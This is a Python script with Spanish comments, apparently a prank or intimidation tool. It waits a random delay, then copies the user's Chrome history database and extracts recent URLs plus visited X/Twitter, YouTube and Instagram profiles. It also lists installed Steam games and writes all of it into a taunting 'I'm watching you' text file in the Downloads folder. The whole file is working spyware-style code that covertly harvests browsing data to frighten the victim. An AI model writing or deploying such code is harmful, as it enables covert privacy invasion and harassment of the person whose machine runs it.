import os
import re
import time
from pathlib import Path
from shutil import copyfile
from time import sleep
from random import randrange
import sqlite3

#CONSTANT

HACKER_FILE = "XXDX--000.txt"


def delay_action():
    # HACER QUE SE CREE EL ARCHIVO CUANDO PASE UNAS HORAS
    x_hours = randrange(1, 4)
    print("DURMIENDO {} HORAS".format(x_hours))
    sleep(x_hours)


def get_user_path():
    return "{}/".format(Path.home())


def generate_txt_message(user_path):
    # Crear archivo
    # a = open(desktop_path + "Para Ti.txt", "w")
    # #Escribir en el archivo
    # a.write("SOY TU MAYOR MIEDO PERRO DE MIERDA")
    # a.close()

    # HACERLO DE UNA MANERA MÁS CHULA
    # with open(user_path + "Downloads\\" + HACKER_FILE, "w") as hackerFile:
    #     hackerFile.write("H9LA SOY EL HACKER DE TIIII")

    hacker_file = open(user_path + "Downloads/" + HACKER_FILE, "w")
    hacker_file.writelines("SOY UN DESGRACIADO PERO TE TENGO VIGILADO\n")
    return hacker_file


def get_chrome_history(user_path):
    #HACER QUE SE EJECUTE HASTA QUE EL GOOGLE SE CIERRE
    ursl = None

    while not ursl:
        try:
            # RUTA A LA BD EN HISTOY DE GOOGLE
            db_history = user_path + "/AppData/Local/Google/Chrome/User Data/Default/History"

            #NOMBRE Y RUTA DONDE SE ENCONTRARÁ LA NUEVA BD COPY
            temp_history = db_history + "_temp"

            #COPIA LA BD PARA QUE SE PUEDA ABRIR ESTA EN VEZ DE LA QUE ES UTILIZADAS POR GOOGLE
            copyfile(db_history, temp_history)
            
            # CREAR UNA CONECTION CON LA RUTA Y ESTAR DENTRO PARA PODER REALIZAR CUALQUIER COSA CON ELLA
            connection = sqlite3.connect(temp_history)

            # APUNTAR A LA BD
            cursor = connection.cursor()

            # REALIZAR SENTENCIA SQL para ver los datos que nos gustaría
            cursor.execute("SELECT title, last_visit_time,url from urls ORDER BY  last_visit_time DESC LIMIT 200")

            # Recoge todos los datos
            urls = cursor.fetchall()

            # MOSTRARMOS POR CONSOLA LA RESPUESTA A LA BD
            print(urls)

            # Cerrar conexion
            connection.close()

            return urls

        except sqlite3.OperationalError:
            print("NO se pudo continuar porque la base de datos esta abierta, Lo intententamos de nuevo ...")
            sleep(2)


def check_history_write(hacker_file, chrome_history):
    for item in chrome_history[:10]:
        hacker_file.write("He visto que has visitado la web : {} , interesante \n".format(item[0]))


def check_profile_of_twitter(hacker_file, chrome_history):
    #ARRAY DONDE SE ALMACENERÁ LOS NONBRES DE LAS CUENTAS
    user_profile = []
    for item in chrome_history:
        results = re.findall("https://x.com/([A-Za-z0-9]+)$", item[2])
        if results and results[0] not in ["notifications", "home", "messages", "explore"]:
            user_profile.append(results[0])

    hacker_file.write("E VISTO QUE HAS ENTRADO EN LOS PERFILES DE TWITTER DE : {}".format(", ".join(user_profile))+"\n")


def check_channel_of_youtube(hacker_file, chrome_history):
    #ARRAY DONDE SE GUARDARÁ EL CANAL DE YOUTUBE
    channels = []
    for item in chrome_history:
        results = re.findall("https://www.youtube.com/@([A-Za-z0-9]+)$", item[2])
        if results and results[0]:
            channels.append(results[0])
    hacker_file.write("\nHAS VISITADO LOS CANALES DE  YOUTUBE ... : {}".format(", ".join(channels))+"\n")


def check_profile_instagram(hacker_file, chrome_history):
    user_insta = []
    for item in chrome_history:
        # results = re.findall("@([A-Za-z0-9]+)" + "• Fotos y vídeos de Instagram", item[0])
        # #SI HEMOS VISITADOS VARIAZ VECES EL MISMO PERFIL LO QUITAMOS CON NOT INT EN LA LISTA
        # if results and results[0] not in user_insta:
        #     user_insta.append(results[0])
        title = item[0]
        if "• Fotos y vídeos de Instagram" in title:
            results = re.findall(r'@([A-Za-z0-9_]+)', title)
            # SI HEMOS VISITADO VARIAS VECES EL MISMO PERFIL LO QUITAMOS CON NOT IN EN LA LISTA
            if results:
                for result in results:
                    if result not in user_insta:
                        user_insta.append(result)
    hacker_file.write(
        "\nSe que has entrado en instagram y has visto unos perfiles como....:{}".format(", ".join(user_insta))+"\n")


def check_games_of_steam(hacker_file):
    try:
        steam_path = "C:/Program Files (x86)/Steam/steamapps/common"
        list_of_games = []

        games = os.listdir(steam_path)
        for games in games:
            if games not in ["Steam Controller Configs", "Steamworks Shared"]:
                list_of_games.append(games)

        hacker_file.write("\nSE QUE HAS JUGADO A ESTOS JUEGOS DE STEAM: \n" + "\n".join(list_of_games))
        # print("HORA DE JUEGO: {}".format(time.ctime(os.path.getmtime(steam_path))))
        print("Juegos guardados:",list_of_games)

    except FileNotFoundError:
        print("No se encontró la ruta")

    #MENSAJE DE MIEDO QUE JUEA A JUEGOS Y ORDENADO POR FECHAS


def main():
    #1 Esperamos que pase el tiempo establecido
    delay_action()

    #CALCULAR LA RUTA DEL USUARIO
    user_path = get_user_path()
    # user_path = "C:\\Users\\alexc\\"  #TAREA SABER SI LA RUTA ES LA DE USUARIO
    # desktop_path = user_path + "Downloads\\"

    #CREAMOS EL ARCHIVO
    hacker_file = generate_txt_message(user_path)


    #RECOGEMOS EL HISTORIAL DEL USUARIO DE GOOGLE
    chrome_history = get_chrome_history(user_path)

    check_profile_of_twitter(hacker_file, chrome_history)

    #Escribiendo message de terror
    check_channel_of_youtube(hacker_file, chrome_history)

    #EXTRAER Y LEER LOS PERFILES DE INSTA Y AGREGARLOS A UN TXT
    check_profile_instagram(hacker_file, chrome_history)

    # Obtener los juegos que tiene en steam
    check_games_of_steam(hacker_file)
    #VER HISTORIAL
    # get_chrome_history(user_path)

    #Obtener nombre del user
    # print(os.getlogin())


if __name__ == '__main__':
    main()

#ANOTACIONES
#NO SE PUEDE EJECUTAR SI EL GOOGLE CHROME ESTA ABIERTO NECESITA ESTAR CERRADO
